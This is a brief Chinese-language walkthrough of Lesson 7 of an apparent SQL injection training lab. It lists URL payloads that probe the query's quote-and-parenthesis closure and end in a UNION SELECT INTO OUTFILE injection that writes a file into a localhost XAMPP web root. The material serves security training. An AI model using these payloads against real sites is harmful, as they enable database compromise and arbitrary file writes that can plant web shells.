# Lesson-07
```
into-outfile
```

这一题的主要难度在于 : 
1. 猜测SQL语句
2. 寻找网站的绝对路径
```
http://127.0.0.1/Less-7/?id=1
http://127.0.0.1/Less-7/?id=1%27
http://127.0.0.1/Less-7/?id=1%27)--+
http://127.0.0.1/Less-7/?id=1%27))--+
http://127.0.0.1/Less-7/?id=1%27))%20union%20select%201,2,3%20into%20outfile%20%27c:\\xampp\\htdocs\\Less-7\\outfile.txt%27--+
```
